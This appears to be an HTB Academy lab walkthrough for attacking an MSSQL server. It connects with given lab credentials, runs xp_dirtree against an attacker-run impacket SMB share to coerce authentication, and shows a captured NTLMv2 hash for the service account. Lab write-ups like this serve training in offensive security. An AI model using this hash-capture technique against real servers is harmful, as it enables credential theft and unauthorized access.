# 🛰️ HTB Academy Lab Scenarios

## 🎯 Initial Database Access

### Scenario 1: Initial Database Access

**Target**: 10.129.203.12 (ACADEMY-ATTCOMSVC-WIN-02)

**Credentials**: htbdbuser:MSSQLAccess01!

```bash
# Install sqlcmd (if needed)
sudo apt install sqlcmd

# Connect to target MSSQL server
sqlcmd -S 10.129.203.12 -U htbdbuser
Password: MSSQLAccess01!
```

**Expected output**:
```bash
1>
```

---

## 🔍 MSSQL Service Hash Capture

### Scenario 2: MSSQL Service Hash Capture

**Task**: Find password for "mssqlsvc" user via hash stealing.

#### Terminal 1 - Start SMB Server

Start an impacket SMB server with SMBv2 support:

```bash
sudo impacket-smbserver share ./ -smb2support
```

**Expected output**:
```bash
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
```

#### Terminal 2 - Execute Hash Stealing Attack

Connect to the SQL server first:

```sql
# Connect to SQL server using htbdbuser credentials
sqlcmd -S 10.129.203.12 -U htbdbuser
Password: MSSQLAccess01!

# Execute xp_dirtree to force SMB authentication (replace with YOUR IP)
EXEC master..xp_dirtree '\\10.10.14.138\share';
GO
```

#### Captured Hash Output

The SMB server captures the NTLMv2 hash:

```bash
[*] Incoming connection (10.129.203.12,49676)
[*] AUTHENTICATE_MESSAGE (WIN-02\mssqlsvc,WIN-02)
[*] User WIN-02\mssqlsvc authenticated successfully
[*] mssqlsvc::WIN-02:aaaaaaaaaaaaaaaa:da87f7aa577b48e8361cf1b021e6bfca:010100000000000000555ef6718cd801e1b423320a45d0570000000001001000760055004a005100610058005200550003001000760055004a00510061005800520055000200100069004700430077004f0055006b0077000400100069004700430077004f0055006b0077000700080000555ef6718cd80106000400020000000800300030000000000000000000000000300000f4316f662256a822989f5d2574efb5b4cbf92c2ce43cb82538c6b2b358a130650a0010000000000000000000000000000000